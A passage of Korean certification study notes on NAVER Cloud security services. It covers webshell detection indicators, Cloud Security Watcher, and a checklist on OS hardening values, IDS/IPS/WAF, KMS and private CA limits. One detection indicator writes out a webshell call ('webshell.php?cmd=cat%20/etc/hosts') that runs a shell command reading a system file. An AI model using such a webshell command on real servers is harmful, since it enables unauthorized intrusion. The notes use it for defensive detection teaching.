2. 접근한 파일의 확장자가 WAS에서 실행 가능한 확장자이나 의도하지 않은 파일
3. 업로드될 수 있는 경로에 존재하는 파일에 접근한 이력
4. 웹쉘이 실행한 명령어가 URL Query String에 남아있는 경우 (`webshell.php?cmd=cat%20/etc/hosts`)
5. `.php`, `.jsp` 등 WAS 실행 확장자 파일
6. 파일 소유자가 WAS 프로세스 실행 권한과 동일한 경우 (예: httpd → nobody, apache → apache, root → root)
7. 파일 생성일자가 웹쉘 행위 발생 시기와 가까운 경우
8. 파일 내용이 서버 사이드 스크립트로 작성되었을 경우

> ⚠️ **시험 포인트**: 에이전트 기반 (Agent 설치 필요) + **행위(Behavior) 기반** 탐지 (패턴 매칭 X)

> **Lab 18**: Webshell Behavior Detector — Webshell Agent 설치 → Webshell 스크립트 작성 → 탐지 알림 확인 → 파일 격리

---

## 🔑 핵심 개념 14: Cloud Security Watcher

**Cloud Security Watcher** = **멀티 클라우드(AWS, Azure) 통합 보안 모니터링** 상품.

- 별도의 대시보드 제공
- **Agent 기반**으로 동작 (서버에 Agent 설치 필요)

### 주요 기능

| 기능 | 설명 |
|------|------|
| **자산 정보 확인 및 감시** | 클라우드/서버별 자산 정보와 애플리케이션 감시 정책에서 발생한 로그 정보 확인. 자산 감시·서버 감시·애플리케이션 감시·전체 자산 현황 관리 |
| **보안 프레임워크 준수 평가 (컴플라이언스 관리)** | 컴플라이언스 프로젝트 관리 기능으로 리소스 설정의 취약점을 주기적으로 점검 |
| **계정 정보 및 변동 이력 확인** | 클라우드 계정과 서버 계정의 현황 및 변경 이력 확인 |
| **방화벽 관리** | 클라우드 서버·네트워크의 방화벽 정책 운영 현황, 차단 Top 로그, 보안 토폴로지 확인. 방화벽 감시·클라우드 및 서버 방화벽 관리·정책 템플릿 기능 제공 |
| **무결성 감시** | 무결성 감시 대상 및 로그 정보 확인 |
| **리소스 상태 감시** | 서버의 자원 현황(CPU, Memory, Disk 등)과 알람 이력 확인. 상태 감시·리소스 및 서버별 감시 현황·리소스 알람·서비스 변화 감시·전체 프로세스·포트 현황 관리 |

### 대시보드 감시 항목
- 자산, 계정, 컴플라이언스, 방화벽, 무결성, 상태, 이벤트, 작업

> **Lab 19**: Cloud Security Watcher — 서비스 이용 신청 → 에이전트 설치 → 계정 추가 후 대시보드 인프라 모니터링

---

## 📝 시험 대비 체크리스트

**보안 위협:**
- [ ] 고전 IP Spoofing/Sniffing → 네트워크 장비 발전으로 사라짐
- [ ] 현재: DDoS/Brute Force 강력화, Application 공격(SQL Injection/XSS), 관리자 PC 권한 탈취(파밍/스미싱/피싱)

**AppSafer:**
- [ ] Android: 난독화(클래스명/메서드명/String), 암호화(Dex/So/Unity), 실시간 환경 탐지(루팅/VM/디버깅/앱변조/메모리변조/스피드핵)
- [ ] iOS: 탈옥/VM/디버깅/우회툴 탐지
- [ ] Android APK: 업로드 → AppSafer 적용 → Protected APK 다운로드 → 마켓 배포

**File Safer:**
- [ ] Hash Filter: 빠름, Hash 값으로 악성 여부 확인
- [ ] File Filter: 느림, 파일 전체 업로드하여 확인

**Web Security Checker:**
- [ ] SQL Injection, XSS, LFI, RFI, SSRF, File Upload, File Download, XXE, Command Injection, Insufficient Authorization 등

**OS Security Checker:**
- [ ] Agent 설치 필요
- [ ] 3가지 점검 가이드: 주요정보통신기반시설 / 전자금융기반시설 / CSAP
- [ ] `/etc/shadow` 권한: **400**
- [ ] `/etc/passwd` 권한: **644**
- [ ] Password 최소 길이: **8자리 이상**
- [ ] UMASK: **027** 또는 **022**
- [ ] Windows: **NTLMv2** 사용 권고
- [ ] Windows 이벤트 로그 최대 크기: **10,240 KB 이상**

**보안 장비:**
- [ ] Firewall: IP/Port 패킷 필터 (L3/L4)
- [ ] **IDS**: 탐지만 (차단 X)
- [ ] **IPS**: 탐지 + 차단
- [ ] WAF: 웹 공격 차단 (L7 - SQL Injection, XSS 등)
- [ ] WAF가 필요한 이유: 비밀번호/웹폼은 방화벽에서 정상 통신으로 취급 → SQL Injection 등 탐지 불가

**KMS:**
- [ ] 봉투 암호화: 루트 키 → 마스터 키 → 데이터 키 → 데이터
- [ ] 루트 키: NCP 관리, 외부 노출 불가
- [ ] 마스터 키 값: 직접 확인 불가

**Certificate Manager:**
- [ ] 만료 **한 달 전**부터 알람 메일+SMS
- [ ] 자동 갱신 (DNS 검증 방식)
- [ ] 연계: Load Balancer, Image Optimizer
- [ ] 발급 기관: NAVER Cloud Trust Services

**Private CA:**
- [ ] X.509 표준 준수
- [ ] 최대 CA: **10개**
- [ ] 최대 인증서: **30,000개**
- [ ] CA 비밀키: KMS와 동일 시스템, 외부 추출/임의 주입 불가
- [ ] 사설 인증서에 포함: 발급자 체인(CRL) + CRL URL + OCSP(선택 활성화)

**Webshell Behavior Detector:**
- [ ] **Agent 기반** 설치
- [ ] **행위(Behavior) 기반** 탐지 (패턴 매칭 X)
- [ ] 파일 격리/복구: Console에서 클릭 한 번
- [ ] 알림: E-mail 또는 SMS, 인터벌 설정 가능

**Cloud Security Watcher:**
- [ ] **멀티 클라우드(AWS, Azure) 통합** 보안 모니터링
- [ ] Agent 기반
- [ ] 자산·계정·컴플라이언스·방화벽·무결성·상태·이벤트·작업 감시

---

## 🧠 암기 핵심 문장

> "**IDS = 탐지만 / IPS = 탐지+차단 / WAF = 웹공격(L7)**"  
> "**KMS = 봉투암호화: 루트→마스터→데이터 키, 마스터 키 값 직접 확인 불가**"  
> "**Private CA: 최대 10개 CA, 30,000개 인증서, X.509 표준, KMS와 동일 시스템**"  
> "**Webshell Detector = Agent 설치 + 행위 기반 + Console에서 격리/복구**"  
> "**/etc/shadow=400, /etc/passwd=644, Windows=NTLMv2, Password 최소 8자**"  
> "**AppSafer Android = 난독화(클래스/메서드/String) + 암호화(Dex/So/Unity) + 실시간 탐지**"  
> "**File Safer = HashFilter(빠름) + FileFilter(느림, 전체 검사)**"  
> "**Cloud Security Watcher = 멀티 클라우드(AWS/Azure) 통합 + Agent 기반**"  
> "**Certificate Manager = 만료 한 달 전 알람 + 자동 갱신 + NAVER Cloud Trust Services**"

---

*다음 챕터: `99_총정리_시험직전체크리스트.md` → 전체 핵심 숫자 총정리*
